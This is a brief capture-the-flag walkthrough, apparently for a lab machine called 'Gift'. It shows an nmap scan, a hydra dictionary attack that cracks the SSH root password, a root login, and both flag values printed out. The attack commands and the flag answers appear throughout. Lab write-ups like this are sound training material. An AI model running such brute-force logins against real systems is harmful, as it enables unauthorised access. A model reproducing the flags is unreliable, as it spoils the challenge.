# Gift

> 主机 IP: 11.11.11.11
>
> 靶场 IP: 11.11.11.12

```sh
$ nmap -A -p- 11.11.11.12

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).

$ hydra -l root -P rockyou.txt -F ssh://11.11.11.12

[22][ssh] host: 11.11.11.12 login: root password: simple

$ ssh root@11.11.11.12
root@11.11.11.12's password:simple
IM AN SSH SERVER
gift:~# whoami
root
gift:~# ls
root.txt  user.txt
gift:~# cat user.txt
HMV665sXzDS
gift:~# cat root.txt
HMVtyr543FG
```
